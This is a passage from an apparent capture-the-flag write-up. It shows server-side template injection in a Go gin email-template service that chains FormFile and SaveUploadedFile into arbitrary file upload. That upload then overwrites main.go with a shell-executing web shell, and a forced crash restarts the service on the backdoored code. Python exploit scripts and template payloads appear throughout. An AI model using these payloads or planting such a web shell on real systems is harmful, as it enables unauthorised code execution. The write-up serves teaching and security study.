</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class="line hl"><span class=cl>                <span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>            <span class=s>&#34;preview.html&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>            <span class=nx>response</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This time, the <code>MyApp</code> custom struct is gone. Instead of the <code>m</code> variable, we notice the <code>c</code> variable of type <code>*gin.Context</code> being passed to the template. This seems like our best bet, so let&rsquo;s check the type and its exported fields. The relevant <a href=https://pkg.go.dev/github.com/gin-gonic/gin#Context>documentation</a> will be used along its <a href=https://github.com/gin-gonic/gin/blob/master/context.go>source code</a>.</p><p>Looking at the documentation for type <code>Context</code>, the following fields are exported (not including functions):</p><div class=highlight><pre aria-label="Box containing code sample." tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>type</span> <span class=nx>Context</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>Request</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span>
</span></span><span class=line><span class=cl>	<span class=nx>Writer</span>  <span class=nx>ResponseWriter</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>Params</span> <span class=nx>Params</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Keys is a key/value pair exclusively for the context of each request.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Keys</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=nx>any</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Errors is a list of errors attached to all the handlers/middlewares who used this context.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Errors</span> <span class=nx>errorMsgs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Accepted defines a list of manually accepted formats for content negotiation.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Accepted</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=c1>// contains filtered or unexported fields
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>Since we have access to <code>Context.Request</code>, one could also look into the exported fields of the type <code>http.Request</code>. Most of my time was spent on trying to find suitable functions in <code>Context</code> or any of its exported fields.</p><p>We are looking for any path that would allows us to read a file. A function of <code>Context</code> grabbed my attention, namely the <code>FileAttachment</code> function:</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1037
</span><span class=lnt>1038
</span><span class=lnt>1039
</span><span class=lnt>1040
</span><span class=lnt>1041
</span><span class=lnt>1042
</span><span class=lnt>1043
</span><span class=lnt>1044
</span><span class=hl><span class=lnt>1045
</span></span><span class=lnt>1046
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// FileAttachment writes the specified file into the body stream in an efficient way
</span></span></span><span class=line><span class=cl><span class=c1>// On the client side, the file will typically be downloaded with the given filename
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>FileAttachment</span><span class=p>(</span><span class=nx>filepath</span><span class=p>,</span> <span class=nx>filename</span> <span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nf>isASCII</span><span class=p>(</span><span class=nx>filename</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>.</span><span class=nf>Header</span><span class=p>().</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;Content-Disposition&#34;</span><span class=p>,</span> <span class=s>`attachment; filename=&#34;`</span><span class=o>+</span><span class=nx>filename</span><span class=o>+</span><span class=s>`&#34;`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>.</span><span class=nf>Header</span><span class=p>().</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;Content-Disposition&#34;</span><span class=p>,</span> <span class=s>`attachment; filename*=UTF-8&#39;&#39;`</span><span class=o>+</span><span class=nx>url</span><span class=p>.</span><span class=nf>QueryEscape</span><span class=p>(</span><span class=nx>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class="line hl"><span class=cl>	<span class=nx>http</span><span class=p>.</span><span class=nf>ServeFile</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>,</span> <span class=nx>filepath</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s upload the following template:</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .c.FileAttachment &#34;/flag.txt&#34; &#34;exfil&#34; }}
</code></pre><p>Previewing our template, we see the following error in our local server&rsquo;s logs:</p><pre aria-label="Box containing code sample." tabindex=0><code>template: preview.html:1:5: executing &#34;preview.html&#34; at &lt;.c.FileAttachment&gt;: can&#39;t call method/function &#34;FileAttachment&#34; with 0 results
</code></pre><p>After some troubleshooting, I end up reading the crucial parts of the documentation of <code>text/template</code> regarding calling methods:</p><pre aria-label="Box containing code sample." tabindex=0><code>The result is the value of invoking the method with dot as the
receiver, dot.Method(). Such a method must have one return value (of
any type) or two return values, the second of which is an error.
If it has two and the returned error is non-nil, execution terminates
and an error is returned to the caller as the value of Execute.
</code></pre><p><code>FileAttachment</code> has no return value, thus we get an error. We need to explore more and now we know the following requirements:</p><ol><li>The function must return 1 or 2 values if the second one is an <code>error</code></li><li>The function must perform some &ldquo;exploitable&rdquo; action.</li><li>The function must use argument types we can provide since we cannot create arbitrary types from within a template.</li></ol><h3 id=the-vulnerability-1><a class=anchor href=#the-vulnerability-1 title='Anchor for: The Vulnerability.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>The Vulnerability</h3><p>After a lot of trial and error, one function looked interesting:</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>590
</span><span class=lnt>591
</span><span class=lnt>592
</span><span class=lnt>593
</span><span class=lnt>594
</span><span class=lnt>595
</span><span class=lnt>596
</span><span class=lnt>597
</span><span class=hl><span class=lnt>598
</span></span><span class=lnt>599
</span><span class=lnt>600
</span><span class=lnt>601
</span><span class=lnt>602
</span><span class=lnt>603
</span><span class=hl><span class=lnt>604
</span></span><span class=lnt>605
</span><span class=lnt>606
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// SaveUploadedFile uploads the form file to specific dst.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>SaveUploadedFile</span><span class=p>(</span><span class=nx>file</span> <span class=o>*</span><span class=nx>multipart</span><span class=p>.</span><span class=nx>FileHeader</span><span class=p>,</span> <span class=nx>dst</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>src</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>file</span><span class=p>.</span><span class=nf>Open</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>src</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>	<span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Create</span><span class=p>(</span><span class=nx>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>out</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>Copy</span><span class=p>(</span><span class=nx>out</span><span class=p>,</span> <span class=nx>src</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>SaveUploadedFile</code> fills the first and second requirements as it returns one value and appears to allow arbitrary file upload. As for the third requirement, there is no way to declare a <code>*multipart.FileHeader</code> object from a template. Would there be?</p><p>Enter the <code>FormFile</code> function:</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>569
</span><span class=lnt>570
</span><span class=lnt>571
</span><span class=hl><span class=lnt>572
</span></span><span class=lnt>573
</span><span class=lnt>574
</span><span class=lnt>575
</span><span class=hl><span class=lnt>576
</span></span><span class=lnt>577
</span><span class=lnt>578
</span><span class=lnt>579
</span><span class=lnt>580
</span><span class=hl><span class=lnt>581
</span></span><span class=lnt>582
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// FormFile returns the first file for the provided form key.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>FormFile</span><span class=p>(</span><span class=nx>name</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=o>*</span><span class=nx>multipart</span><span class=p>.</span><span class=nx>FileHeader</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nx>MultipartForm</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nf>ParseMultipartForm</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>engine</span><span class=p>.</span><span class=nx>MaxMultipartMemory</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class="line hl"><span class=cl>	<span class=nx>f</span><span class=p>,</span> <span class=nx>fh</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nf>FormFile</span><span class=p>(</span><span class=nx>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class="line hl"><span class=cl>	<span class=k>return</span> <span class=nx>fh</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The <code>FormFile</code> function fulfills the first requirement due to returning a <code>*multipart.FileHeader</code> and an <code>error</code> as second value. It also fulfills the third requirement as we can easily pass a <code>string</code> to the function. As for the second requirement, this function fetches a named file from our multipart form request which we control the contents of. Since this returns the exact type expected by <code>SaveUploadedFile</code>, this is the perfect gadget combination to achieve arbitrary file upload!</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) .title }}
</code></pre><p>Testing locally, it works. We preview by sending a multipart form request which contains a file with the form input name <code>fish</code> and a URL query parameter <code>title</code> containg a file path. Good thing for us that the parentheses will be considered as only the first return value and not include the error (if it is nil).</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-7fe5c15819a3af65.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) .title }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;afile&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?title=/example/file.txt&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>But&mldr; then what? This does not allow us to read files.</p><h3 id=the-exploitation><a class=anchor href=#the-exploitation title='Anchor for: The Exploitation.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>The Exploitation</h3><p>At this point, I could not find any other useful and usable function. We need to find a way to push this further. I did not mention it, but on the first level I explored the filesystem of the challenge server while trying to find the flag. I noticed a few things.</p><p>The root <code>/</code> directory had <code>/app/</code> which contains the challenge&rsquo;s code. The root also contained <code>/app.bk/</code> which appeared to be a copy/backup of <code>/app/</code>.</p><p>Since level 1, the challenge offered the possibility of resetting the challenge due to concerns of being stuck in a restart loop. That could be done by visiting the route <code>/reset</code>. I hadn&rsquo;t noticed that route in the Go code, so it must be implemented in some other way. When exploring the filesystem in level 1, I found two PHP scripts which Apache pointed at when we visited <code>GET /reset</code> and <code>GET /source</code>.</p><p>The <code>reset.php</code> script took care of replacing the <code>/app/</code> directory with a clean copy of the backup and restarting the challenge service.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=hl><span class=lnt> 2
</span></span><span class=lnt> 3
</span><span class=hl><span class=lnt> 4
</span></span><span class=lnt> 5
</span><span class=hl><span class=lnt> 6
</span></span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/systemctl stop email-template&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;/usr/bin/rm -rf /app/*&#34;</span><span class=p>);</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;/usr/bin/cp -r /app.bk/* /app/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/chown -R www-data: /app/&#34;</span><span class=p>);</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/systemctl start email-template&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;meta http-equiv=&#34;refresh&#34; content=&#34;5; url=&#39;/&#39;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;title&gt;Reset&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>        Resetting... Autoredirect after 5 seconds
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>The <code>source.php</code> script took care of showing us the contents of <code>main.go</code>. This functionality also wasnt seen in the Go code, so now it makes sense now.</p><p>My first train of thought was to try and backdoor <code>/app.bk/main.go</code> and reset so that we get setup a backdoored version of the challenge. This did not work as we did not have permissions to write in <code>/app.bk/</code>. Putting a PHP file in <code>/var/www/html/</code> was also not usable, due to the proxy only taking <code>reset</code> and <code>source</code> and I don&rsquo;t remember if we even had the permissions to do so.</p><p>We could try to backdoor <code>/app/main.go</code> (which we do have permissions for) but this wouldn&rsquo;t change the program that is already loaded in memory.</p><p>Since the start, I had experienced a few times where the server would crash and a message would appear that it is currently restarting. Usually when a Go source is compiled, it is built into an <code>.exe</code>, but I did not see one in the <code>/app/</code> directory. Another way to run Go code is through a <code>go run main.go</code> command which does not create a <code>.exe</code> file. Therefore, I made a guess that the service would perform a <code>go run main.go</code> command which would run it as it is then on every service restart.</p><p>To recap:</p><ul><li>We have arbitrary file upload.</li><li>We can overwrite <code>/app/main.go</code></li><li>We can maybe get our modified version ran if the service restarts (without a full reset).</li></ul><p>One way to crash the server would be to reach one of the many calls to <code>log.Fatal</code> which is described as <code>Fatal is equivalent to Print() followed by a call to os.Exit(1)</code>. The one I ended up reaching was due to an error after calling <code>c.BindJSON(&update)</code> on line 47. To reach it, all we need to do is not send a JSON payload with <code>template</code> in it. An error will occur and the <code>log.Fatal</code> will be reached, terminating the server.</p><p>In my backdoored <code>main.go</code>, I implemented a very basic web shell on the route <code>GET /</code>.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>cmd</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>DefaultQuery</span><span class=p>(</span><span class=s>&#34;fish&#34;</span><span class=p>,</span> <span class=s>&#34;id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=nx>cmd</span><span class=p>).</span><span class=nf>Output</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nf>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=s>&#34;%s\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nf>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=s>&#34;%s\n&#34;</span><span class=p>,</span> <span class=nx>out</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></td></tr></table></div></div><p>Here was my exploit script.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-7fe5c15819a3af65.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) &#34;/app/main.go&#34; }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
